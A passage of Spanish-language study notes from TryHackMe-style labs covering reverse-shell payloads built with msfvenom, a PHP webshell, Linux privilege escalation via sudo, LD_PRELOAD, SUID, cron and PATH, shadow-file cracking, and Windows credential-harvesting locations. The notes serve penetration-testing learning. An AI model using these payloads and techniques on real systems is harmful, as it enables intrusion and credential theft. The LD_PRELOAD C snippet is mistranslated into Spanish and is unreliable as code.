msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

Las opciones son:

- *-f*: formato en el que se expide el ejecutable. 
- *-o*: Nombre del fichero en el que se va a expedir el ejecutable.

Recordamos que con Metasploit (y por extensión con Msvenom) existen dos tipos de payloads; staged aquellos que se envían en dos partes: el stager y este una vez dentro se descarga el resto, y el stagedless que se envían de una sola vez y son más comunes aunque más fáciles de interceptar y de ser detectados por antimalware.

Por último, es importante es entender el sistema de nombres de Metasploit, lo más habitual es encontrarnos el siguiente esquema: \<OS>/\<arquitectura>/\<payload>.

Por ejemplo: linux/x86/shell_reverse_tcp

(La arquitectura no se especifica en sistemas de 32 bits por defecto): windows/shell.

Además debemos fijarnos en cómo están escritos los nombres de ciertos payloads. Antes hemos descrito una diferencia entre dos payloads, staged y stagedless:

- *stagedless*: Los stagedless vienen identificados por las barrabajas, '\_'. Por ejemplo: linux/x86/meterpreter_reverse_tcp

- *staged*: Los staged contienen una '/' en el nombre del payload: windows/x64/meterpreter/reverse_tcp

	Ahí vemos que en el ejemplo anterior tenemos sistemaoperativo/arquitectura/payload y el payload contiene una barra de más.

Por último, conviene saber que podemos tener todos los payloads listados mediante: msfvenom --list payloads.

<br />

**Metasploit multi/handler**

El módulo multi/handler de metasploit es un tipo handler que se emplea sobre todo en la recepción de módulos reverse shell de explotación. 

Es relativamente fácil de usar:

- Abrimos msfconsole.
- Tecleamos: use multi/handler 
- Tecleamos: options.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731094430.png' | relative_url }}" text-align="center"/>
</div>

De entre todas las opciones que existen, hay tres fundamentales que es necesario setear:

- set payload \<payload>
- set LHOST \<listen-address>
- set LPORT \<listen-port>

Una vez configuradas las opciones lanzamos el modulo mediante el comando: exploit -j (el modificador -j nos permitirá lanzarlo en segundo plano como un "job" para que podamos seguir usando la terminal mientras el proceso sigue escuchando una conexión)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731095959.png' | relative_url }}" text-align="center"/>
</div>

Como se ve en la parte final de la imagen anterior, finalmente recibe una conexión y crea un sesión tcp. Esta sesión estará visible con el comando: "sessions" y accesible con "sessions \<number>":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731100155.png' | relative_url }}" text-align="center"/>
</div>

<br />

**WebShells**

Puede surgir en alguna ocasión sitios web que nos permitan subir de alguna u otra forma un fichero ejecutable. En teoría, este defecto podría ser aprovechado para subir un fichero que genere una reverse shell, sin embargo, esto no es a veces posible pero en su lugar podemos ejecutar una *webshell*.

El término *webshell* es un término coloquial para referirse a un script dentro de un webserver y que permite la ejecución remota de comandos. 

Un ejemplo sencillo de este tipo de scripts en php sería:

```PHP
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Existen multitud de webshells añadidas en Kali Linux por defecto en el path: /usr/share/webshells.

<br />

#### 7.2. Linux Privilege Escalation.

**Intro**

En esta sección vamos a cubrir lo que es la técnica de la escalada de privilegios y sus múltiples vías.

<br />

**What is Privilege Escalation?**

En un sentido técnico, la Elevación de Privilegios consiste en al explotación de una vulnerabilidad que tiene por finalidad ganar acceso a un conjunto de recursos que permite tener mayor control sobre un dispositivo concreto. Generalmente, en la mayor parte de dispositivos y por una cuestión de seguridad distinguimos dos tipos de usuarios, dos tipos de cuentas que hacen uso del mencionado dispositivo: usuarios sin privilegios (users) y usuarios con privilegios (admins, root, superuser, etc).

<br />

**Enumeration**

A continuación, damos por supuesto que tenemos acceso inicial a una máquina con un usuario sin privilegios.

Vamos a detallar una lista de ficheros y comandos que pueden ofrecernos  información relevante en lo relativo a la tarea de elevar privilegios. 

- *hostname*: Es un comando que devuelve el hostname del target machine. A veces puede aportar información del rol que el dispositivo tiene en la red. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830174106.png' | relative_url }}" text-align="center"/>
	</div>
	
- *uname -a*: Muestra por pantalla información del dispostivio y del kernel.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830174127.png' | relative_url }}" text-align="center"/>
	</div>
	
- */proc/version*: Se trata de un fichero perteneciente al sistema de ficheros *proc* presente en muchas distros de Linux, estos contienen información acerca de procesos del sistema operativo. En concreto, /proc/version aporta información acerca del kernel, el compilador, etc:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830174808.png' | relative_url }}" text-align="center"/>
	</div>

- */etc/issue*: Información genérica sobre el sistema operativo aunque esta puede ser modificado, no es 100% fiable.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830175212.png' | relative_url }}" text-align="center"/>
	</div>

- *ps*: Se trata de un comando para sistemas basados en Unix que ofrece un listado de procesos en ejecución del sistema. Concretamente la información que proporciona este sistema es:

	- *PID*: El ID (número identificador del proceso).
	- *TTY*: Tipo de terminal empleado en su ejecución. 
	- *Time*: Monto de tiempo que la CPU a empleado con el proceso.
	- *CMD*: Comando en ejecución. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830180715.png' | relative_url }}" text-align="center"/>
	</div>

	Además, el comando *ps* contiene algunos modificadores interesantes como el *-A* que ofrece todos los procesos en ejecución, *axjf* que muestra una formación en arbol de los procesos y subprocesos o *aux* que muestra todos los procesos de todos los usuarios indicando de a qué usuario pertenece cada proceso. 

	<br />

- *env*: El comando *env* muestra variables de entorno. Valores almacenados bajo nombres que el sistema utiliza para su correcto funcionamiento. De entre ellas destacamos como la más importante la variable PATH que contiene las rutas de directorios, el sistema utiliza esta variable para buscar los binarios que se ejecutan con un nombre desde una terminal.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830183019.png' | relative_url }}" text-align="center"/>
	</div>

- *sudo -l*: Este es un comando que muestra todos los comandos que un usuario puede ejecutar como super usuario (un comando es un binario que se ejecuta desde la terminal mediante un nombre y que se encuentra alojado en una de las direcciones contenidas en la variable de entorno PATH). A menudo hay que utilizar contraseña para ejecutar este comando. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830184311.png' | relative_url }}" text-align="center"/>
	</div>

- *Id*: El comando Id muestra los grupos a los que el usuario que lo ejecuta pertenece:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830184456.png' | relative_url }}" text-align="center"/>
	</div>

	Importante, aquellos usuarios que pueden emplear el comando sudo para ejecutar comandos como el superusuario están en el grupo *sudo*.

	<br />
	
- */etc/passwd*: Contiene información sobre todos los usuarios del sistema:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830190931.png' | relative_url }}" text-align="center"/>
	</div>

	Muchos de estos usuarios son servicios que se ejecutan dentro del sistema con caracter de mantenimiento. La mejor forma de obtener usuarios reales (al margen de root) es filtrar por el término *home* con *grep*:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830191952.png' | relative_url }}" text-align="center"/>
	</div>

	Esto es debido a que uno de los apartados (notemos que las líneas están separadas en fragmentos por ':') hace referencia a la localización de la carpeta personal de dicho usuario. Podemos hacer la asunción de que serán usuarios todos aquellos cuya carpeta personal esté dentro del directorio *home* y de ahí el comando.

	<br />

- *history*: Muestra un listado de comandos escritos en la terminal. Si sobre algún comando se introduce información sensible esto podría quedar guardado en el historial.

	<br />

- *ifconfig*: Muestra información sobre las interfaces de red, como cuántas hay, la IP asociada a cada una etc:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830192702.png' | relative_url }}" text-align="center"/>
	</div>

	Análogo a este comando está *ip a* o *ip route*.

	<br />

- *netstat*: Netstat es un comando que soporta múltiples opciones de recopilación de información sobre comunicaciones existentes:
	
	- *-a*: Muestra todos los puertos escuchando.
	- *-at/au*: Muestra sólo puertos TCP/UDP respectivamente.
	- *-l*: Lista puertos en modo "escucha" de peticiones entrantes, esto puede combinarse con los modificadores anteriores para por ejemplo sólo obtener los puertos TCP en modo escucha.
	
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830194317.png' | relative_url }}" text-align="center"/>
	</div>

	- *-s*: Lista las estadísticas de red por protocolo. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830194914.png' | relative_url }}" text-align="center"/>
	</div>

	- *-tp*: Lista conexiones con el nombre del servicio y el PID (Process ID)

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830195004.png' | relative_url }}" text-align="center"/>
	</div>

	- *-i*: Enseña estadísticas de interfaz.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830202311.png' | relative_url }}" text-align="center"/>
	</div>

	- *-o*: Despliega timers.

		<br />

- *find*: Permite buscar archivos en el sistema operativo.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830202653.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830202706.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830202727.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830202742.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

**Automated Enumeration Tools**

Existen diversas herramientas de enumeración automatizada:

-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

	<br />

**Kernel Exploits**

La escalada de privilegios idealmente conduce a privilegios de root. A veces, esto se puede lograr simplemente explotando una vulnerabilidad existente o, en algunos casos, accediendo a otra cuenta de usuario que tenga más privilegios, información o permisos.

A menos que una sola vulnerabilidad conduzca a una root-shell, el proceso de escalada de privilegios se basará en configuraciones incorrectas y/o permisos poco estrictos.

El kernel es un componente del sistema operativo fundamental, gestiona la comunicación entre componentes como la RAM y las aplicaciones. Esta función crítica requiere que el kernel tenga privilegios específicos; por lo tanto, una malconfiguración del kernel y una correcta explotación conducirá potencialmente a privilegios de root.  

La metodología de explotación de Kernel es simple;

1.  Identificar la versión del kernel.
2.  Buscar un código de explotación para la versión del kernel del target.
3.  Ejecutar el exploit.

Aunque parece simple, recuerde que una explotación fallida del kernel puede provocar un bloqueo del sistema. Asegúrese de que este resultado potencial sea aceptable dentro del alcance de su compromiso de prueba de penetración antes de intentar una explotación del kernel.

Por ejemplo, supongámos que hemos tomado control de un sistema como un usuario con pocos privilegios:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831104510.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, empleamos el comando *uname -r* para obtener la versión del kernel:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831104614.png' | relative_url }}" text-align="center"/>
</div>

Buscamos un exploit para dicha versión del kernel y lo descargamos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831104712.png' | relative_url }}" text-align="center"/>
</div>

Una vez lo hemos descargado, lo razonable parece, al ser un script de elevación de privilegios, ejecutarlo en el target.

Así, en nuestra máquina local montamod un HTTPServer con python

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831105836.png' | relative_url }}" text-align="center"/>
</div>

Y descargamos el contenido desde la máquina target:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831105815.png' | relative_url }}" text-align="center"/>
</div>

Observemos de que hemos procedido con la descarga en el directorio /tmp, ya que este es un directorio que siempre tiene permisos de escritura.

Una vez lo tenemos en la máquina objetivo, damos permisos de ejecución, compilamos y ejecutamos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831110206.png' | relative_url }}" text-align="center"/>
</div>

Buscamos la flag y habríamos terminado la prueba:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831110347.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Privilege Escalation: Sudo**

El comando *sudo*, por defecto, permite ejecutar un programa con privilegios de root. El administrador del sistema puede permitir que este usuario solo ejecute Nmap con privilegios de raíz mientras mantiene su nivel de privilegio regular en el resto del sistema.

Cualquier usuario puede verificar su situación actual relacionada con los privilegios de root usando *sudo -l* y sobre las variables que se heredan cuando se ejecuta una acción como superusuario.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831124201.png' | relative_url }}" text-align="center"/>
</div>

Una variable especialmente dañina es LD_PRELOAD, es una variable que permite cargar código antes de la ejecución de un binario permitiendo ejecutar de facto cualquier comando como root (como una shell).

Los pasos de este vector de escalada de privilegios se pueden resumir de la siguiente manera;

1.  Compruebe LD_PRELOAD (con la opción env_keep)
2.  Escriba un código C simple compilado como un archivo de objeto compartido (extensión .so)
3.  Ejecute el programa con derechos sudo y la opción LD_PRELOAD apuntando a nuestro archivo .so

	```bash
	#incluye <stdio.h>  
	#incluye <sys/types.h> #incluye  
	<stdlib.h>  
	  
	void _init() {  
	unsetenv("LD_PRELOAD");  
	setgid(0);  
	setuid(0);  
	sistema("/bin/bash");  
	}
	```
	
Por otra parte, [https://gtfobins.github.io/](https://gtfobins.github.io/) es una fuente valiosa que proporciona información sobre cómo se puede usar cualquier programa, en el que pueda tener derechos de sudo con el fin de elevar privilegios entre otras cosas.

Un ejemplo práctico sería el siguiente. Supongámos que tenemos acceso a una máquina a través de un usuario con bajos privilegios como en el caso anterior:

- En primer lugar, ejecutamos *sudo -l*:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220831125250.png' | relative_url }}" text-align="center"/>
	</div>

	 Entre otros programas vemos que tenemos acceso al comando *nano* comp root y sin tener la necesidad de utilizar la contraseña.
	 
- Así, acudimos a GTFOBins y buscamos el término Nano:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220831125514.png' | relative_url }}" text-align="center"/>
	</div>

- De esta forma, ejecutamos Nano con sudo, pulsamos Ctrl+R y Ctrl+X y escribimos: reset; sh 1>&0 2>&0. Obteniendo:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220831125641.png' | relative_url }}" text-align="center"/>
	</div>

Y habríamos terminado teniendo una shell como root. 

<br />

**Privilege Escalation: SUID**

Existe una forma especial de permiso denominado como SUID/SGID (Set-user Identification/Set-group Identification), los ficheros que contienen este tipo de permisos pueden ser ejecutados como el usuario propietario de dicho fichero. Así, son especialmente interesantes y potencialmente dañinos aquellos ficheros con el bit SUID habilitado cuyo propietario es root.

En el contexto de una elevación de privilegios de una máquina podemos listar todos aquellos ficheros con el bit SUID/SGID habilitado con el siguiente comando:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831133202.png' | relative_url }}" text-align="center"/>
</div>

Una buena práctica sería comparar los ejecutables de esta lista con [GTFOBins](https://gtfobins.github.io/) ). Al hacer clic en el botón SUID, se filtrarán los binarios que se sabe que son explotables cuando se establece el bit SUID.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831133317.png' | relative_url }}" text-align="center"/>
</div>

La lista anterior muestra que nano tiene el bit SUID establecido. Desafortunadamente, GTFObins no nos brinda una victoria fácil. Típicos de los escenarios de escalada de privilegios de la vida real, necesitaremos encontrar pasos intermedios que nos ayuden a aprovechar cualquier hallazgo minúsculo que tengamos.

Veámos un ejemplo práctico de cómo utilizar esta característica. En primer lugar, comprobamos que tenemos acceso de lectura al fichero /etc/passwd y observamos los usuarios que hay:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831143745.png' | relative_url }}" text-align="center"/>
</div>

Entre ellos vemos el usuario user2, que tal y como indica el propio fichero tiene su contraseña cifrada en el archivo /etc/shadow que es inaccesible para cualquier que no sea el superusuario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831144227.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo, entre los ficheros con el bit SUID encontramos el base64:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831144852.png' | relative_url }}" text-align="center"/>
</div>

Con este podemos realizar una lectura de un fichero como root:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831144938.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, procedemos a leer la línea del fichero /etc/passwd correspondiente a user2:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831145112.png' | relative_url }}" text-align="center"/>
</div>

Y ahí tenemos la contraseña cifrada, sólo queda pasar el formato a uno que johntheripper pueda crakear y pasarlo por el mencionado comando.

Para ello, en primer lugar, seleccionamos las líneas correspondientes al usuario en los ficheros passwd y shadow en /etc: 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831145701.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, procedemos a descargarlas sobre nuestra máquina local:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831145908.png' | relative_url }}" text-align="center"/>
</div>

Y en nuestra máquina local procedemos a utilizar las herramientas de unshadow y johntheripper para crackear la contraseña:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831150137.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Capabilities**

*Capabilities* en Linux son atributos especiales que pueden asignarse a procesos, archivos binarios, servicios y usuarios y pueden otorgarles privilegios específicos que normalmente están reservados para acciones de superusuario, como poder interceptar tráfico de red o montar/desmontar sistemas de archivos. Si están mal configurados, estos podrían permitir que un atacante eleve sus privilegios a root.

Para poder listar binarios con *capabilities* empleamos el término:

```bash
getcap -r / 2>/dev/null
```

De nuevo, GTFOBins es de gran ayuda para binarios con capabilities.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831162449.png' | relative_url }}" text-align="center"/>
</div>

Funciona al mismo nivel que como ocurría con los ficheros SUID con la diferencia de que los binarios con capabilities no se ejecutan enteramente como root, sólo determinadas acciones específicamente diseñadas para ello.

<br />

**Privilege Escalation: Cron Jobs**

Los *Cron Jobs* se utilizan para ejecutar scripts o archivos binarios en momentos específicos. De forma predeterminada, se ejecutan con el privilegio de sus propietarios y no del usuario actual. Si bien los trabajos cron correctamente configurados no son intrínsecamente vulnerables, pueden proporcionar un vector de escalada de privilegios en algunas condiciones.

La idea es muy simple; si hay una tarea programada que se ejecuta con privilegios de root y podemos cambiar o bien el script o bien parte de su contenido o bien sustituirlo por un script malicioso debido a una mala configuración de la variable PATH, nuestro script se ejecutará con privilegios de root y tendremos una shell como root:  
  
La configuración de cron se almacena en *crontabs* (tablas cron) para ver la próxima hora y fecha en que se ejecutará la tarea.  
  
Cada usuario en el sistema tiene su archivo crontab y puede ejecutar tareas específicas ya sea que haya iniciado sesión o no. Como puede esperar, nuestro objetivo será encontrar un trabajo cron configurado por root y hacer que ejecute nuestro script, idealmente una shell.  
  
Cualquier usuario puede leer el archivo manteniendo trabajos cron de todo el sistema en /etc/crontab.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831173255.png' | relative_url }}" text-align="center"/>
</div>

Crontab siempre vale la pena comprobarlo, ya que a veces puede conducir a vectores de escalada de privilegios fáciles. El siguiente escenario no es raro en empresas:

1.  Los administradores del sistema deben ejecutar un script a intervalos regulares.
2.  Crean un trabajo cron para hacer esto
3.  Después de un tiempo, el script se vuelve inútil y lo eliminan.  
4.  No limpian el trabajo cron relevante

Veámos un ejemplo. En primer lugar, echamos un vistazo al fichero */etc/crontabs*, en él podemos observar que root ejecuta cuatro binarios, entre ellos un fichero del directorio personal de nuestro usuario Karen:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831180114.png' | relative_url }}" text-align="center"/>
</div>

Así, listamos los contenidos de nuestro directorio personal y observamos que podemos sobreescribirlo. De esta forma, realizamos un script malicioso que ejecuta una bindshell por nombre backup.sh:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831180339.png' | relative_url }}" text-align="center"/>
</div>

Lo testeamos, comprobamos que funciona y esperamos a que root ejecute el script, momento en el que intentaremos llevar a cabo una conexión con netcat al puerto 4444:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831180436.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Variable PATH**

Si una carpeta para la que su usuario tiene permiso de escritura se encuentra en la ruta, podría secuestrar una aplicación para ejecutar un script. PATH en Linux es una variable ambiental que le dice al sistema operativo dónde buscar ejecutables. Para cualquier comando que no esté integrado en el shell o que no esté definido con una ruta absoluta, Linux comenzará a buscar en las carpetas definidas en PATH. (PATH es la variable ambiental de la que estamos hablando aquí, path es la ubicación de un archivo).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831181428.png' | relative_url }}" text-align="center"/>
</div>

Si escribimos "thm" en la línea de comando, estas son las ubicaciones en las que Linux buscará un ejecutable llamado thm. Esto depende completamente de la configuración existente del sistema de destino, así que asegúrese de preguntar:

1.  ¿Qué carpetas se encuentran en $PATH?
2.  ¿Tiene el usuario actual privilegios de escritura para alguna de estas carpetas?
3.  ¿Se puede modificar $PATH?
4.  ¿Hay algún script/aplicación que pueda iniciar que se verá afectado por esta vulnerabilidad?

Veámos un ejemplo práctico. En primer lugar, observamos que en un directorio existe un script con el bit de SUID habilitado que llama a un binario concreto:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831183924.png' | relative_url }}" text-align="center"/>
</div>

Al mismo tiempo, tenemos permisos de escritura sobre este directorio y podemos modificar la variable PATH. Así, escribimos en este directorio un script de bindshell en bash:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831184915.png' | relative_url }}" text-align="center"/>
</div>

Y modificamos el contenido de la variable PATH para incluir como primera opción el directorio en el que se encuentra este script:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831184510.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, ejecutamos el script y automáticamente iniciamos una conexión con Netcat al puerto 4444, como el script tiene le bit de SUID se ejecutará como root

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831185002.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831185012.png' | relative_url }}" text-align="center"/>
</div>

<br />

**NFS**

Los vectores de la escalada de privilegios no se limitan al acceso interno. Carpetas comparitdas o servicios de administración remota también son un punto de acceso. En esta parte concretamente nos centraremos en NFS.

Concretamente existe un fichero */etc/exports* que guarda la configuración del NFS, se crea durante la instalación del servidor del mismo y normalmente los usuarios tienen acceso a él.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831195100.png' | relative_url }}" text-align="center"/>
</div>

Dentro de este fichero, la característica principal desde nuestro punto de vista es el término *no_root_squash*, que cambia la propiedad de aquellos archivos compartidos cuyo propietario sea root.

Si hubiera un script propiedad de root con el bit de SUID habilitado en un servidor compartido y se accediese a ese script mediante una máquina remota la configuración "no_root_squash" prevendría que dicho script en la máquina remota fuera de hecho propiedad de root.

<br />

**Capstone Challenge**

Este reto se resuelve primero efectuando una escalada de privilegios lateral sobre el usuario "missy" robando el hash de su contraseña del fichero /etc/shadow aprovechando el bit SUID del binario base64 para leer ficheros:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831211654.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831211722.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831211830.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente preparamos dicho hash en un formato para john the ripper con el comando *unshadow*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831212039.png' | relative_url }}" text-align="center"/>
</div>
<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831212048.png' | relative_url }}" text-align="center"/>
</div>

(Con el fichero shadow.txt es posible que se tenga que recurri a un editor de textos para que se copie correctamente)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831212137.png' | relative_url }}" text-align="center"/>
</div>

Una vez hemos elevado privilegios lateralmente, procedemos a explorar las posibilidades del segundo usuario, dándonos cuenta de que podemos utilizar el comando *find* con sudo sin contraseña:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831212356.png' | relative_url }}" text-align="center"/>
</div>

De forma que acudimos a GTFOBins y:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831212417.png' | relative_url }}" text-align="center"/>
</div>

De forma que:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220831212439.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 7.3. Windows Privilege Escalation.

**Intro**

En pocas palabras, la escalada de privilegios consiste en usar el acceso dado a un host con el "usuario A" y aprovecharlo para obtener acceso al "usuario B" abusando de una debilidad en el sistema. Aunque por lo general querremos que el "usuario B" tenga derechos administrativos, puede haber situaciones en las que debamos escalar a otras cuentas sin privilegios antes de obtener privilegios administrativos (elevación de privilegios lalteral).

Obtener acceso a diferentes cuentas puede ser tan simple como encontrar credenciales en archivos de texto u hojas de cálculo que algún usuario descuidado no haya protegido, pero ese no siempre será el caso. Dependiendo de la situación, es posible que necesitemos abusar de algunas de las siguientes debilidades:

-   Configuraciones incorrectas en servicios de Windows o tareas programadas
-   Privilegios excesivos asignados a nuestra cuenta
-   software vulnerable
-   Faltan parches de seguridad de Windows

Veámos una serie de conceptos previos:

Los Windows OS mantienen fundamentalmente dos tipos de usuarios 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901104604.png' | relative_url }}" text-align="center"/>
</div>

Por otra parte, cualquier usuario con privilegios administrativos forma parte de, grupo *Administrators* mientras que un usuario con pocos privilegios se encuentran dentro del grupo *Users*. 

Por otra parte, tenemos que las siguientes cuentas pueden ser importantes en un contexto de elevación de privilegios. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901120325.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Harvesting Password from Usual Spots**

La forma más fácil de ganar acceso a otras cuentas es recolectar credenciales en una máquina comprometida que están ahí debido al descuido de los usuarios mismos o fallas de configuración. 

Veámos algunos casos prácticos:

- *Instalaciones de Windows desatendidas*:

	Cuando se instala Windows en un número largo de hosts, los administradores suelen usar *Windows Deployment Services*, los cuales permiten desplegar una única imagen de Windows OS en varios hosts a lo largo de una red. Este tipo de instalaciones son denominadas como *Unattended Instalations* porque tales procesos no requieren de la interacción del usuario. 

	Sin emabargo, lo interesante es que, como cualquier otra instalación, se necesita en algún punto permisos de adminstrador y puede ocurrir que tales credenciales queden almacenadas en algún punto del sistema, los más habituales son:

	-   C:\\Unattend.xml
	-   C:\\Windows\\Panther\\Unattend.xml
	-   C:\\Windows\\Panther\\Unattend\\Unattend.xml
	-   C:\\Windows\\system32\\sysprep.inf
	-   C:\\Windows\\system32\\sysprep\\sysprep.xml

	Dentro de alguno de estos ficheros podemos encontrar partes como esta:

	```xml
	<Credentials>
	    <Username>Administrator</Username>
	    <Domain>thm.local</Domain>
	    <Password>MyPassword123</Password>
	</Credentials>
	```

	<br />
	
- *Powershell History*:

	El historial de comandos Powershell que un usuario ejecuta en una instancia se guarda en un fichero que sirve a distintos propósitos. Este fichero nos interesa debido a que si un usuario introduce por error, o por que las opciones de la instrucción así lo requieren, una contraseña en el prompt esta quedará guardada en el fichero anterior, siendo accesible para todo aquel que pueda leer dicho fichero. 

	El path para leer este fichero es:

	```cmd
	%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
	```

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220901131908.png' | relative_url }}" text-align="center"/>
	</div>
	
	Esto sólo sirve dentro de una CMD, ya que powershell no reconoce *%userprofile%* como una variable de entorno. Para leerlo desde powershell se debe sustituir *%userprofile%* por *$Env:userprofile*.

	<br />
	
- *Saved Windows Credentials*:

	Windows permite a los usuarios utilizar las credenciales de otros usuarios e incluso a guardarlas. El comando:

	```bash
	cmdkey /lis
	```

	listará credenciales guardadas. También podemos emplear el comando *runas* con la opción */savedcred*:

	```cmd
	runas /savecred /user:admin cmd.exe
	```

	Por ejemplo, con cmdkey /list, listamos posibles credenciales guardados y con runas /savedcred accedemos a la terminal de otro usuario:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220901132506.png' | relative_url }}" text-align="center"/>
	</div>

	<br />
	
- *IIS Configuration*:

	IIS son las siglas de Internet Information Services y es el web server por defecto de las instalaciones Windows. La configuración de esta aplicación está guardada sobre el fichero *web.config* y puede guardar credenciales de bases de datos o sobre autenticación de mecanismos. 

	Por su parte, este ficheor puede estar localizado sobre:

	-   C:\\inetpub\\wwwroot\\web.config
	- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config

	<br />

	<div style="text-align:center">
